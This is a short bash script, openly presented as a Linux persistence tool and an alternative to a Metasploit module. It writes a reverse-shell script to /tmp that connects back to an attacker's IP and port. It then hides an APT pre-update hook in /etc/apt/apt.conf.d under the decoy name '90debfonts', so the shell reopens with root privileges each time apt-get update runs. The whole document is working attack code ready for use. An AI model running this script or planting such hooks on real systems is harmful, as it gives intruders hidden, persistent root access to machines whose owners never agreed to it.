#/bin/bash

#########################################################################################################################  
# apt-get_update_hook.sh                                                                                                #
# Gain persistence through apt-get update                                                                               #
# Every time user tries sudo apt-get update command we gain root access if we set a listener first                      #
# an alternative to /metasploit-framework/blob/master/modules/exploits/linux/local/apt_package_manager_persistence.rb   #
# by 0bfxgh0st*                                                                                                         #
#########################################################################################################################

if [[ $(id -u) != 0 ]]
then
	printf "%s\n" "Run this program as sudo user"
	exit
fi


function _help_(){

	printf "%s\n" "usage sudo bash apt-get_update_hook.sh <ip> <port>"
	exit
}


function apt-get_update-hook(){

custom_script="/tmp/8736479374"
apt_file="/etc/apt/apt.conf.d/90debfonts"

cat << EOF > "$custom_script"
#!/bin/bash
bash -c "bash -i >& /dev/tcp/$1/$2 0>&1" 2>/dev/null &
EOF

cat << EOF > "$apt_file"
APT::Update::Pre-Invoke {"bash $custom_script";};
EOF

printf "[\e[0;32m+\e[0m] apt-get update hooked\n"
printf "[\e[0;32m+\e[0m] Persistence through apt-get update success\n"

}


if [[ -z "$1" ]] || [[ -z "$2" ]]
then
	_help_
fi

apt-get_update-hook "$1" "$2"

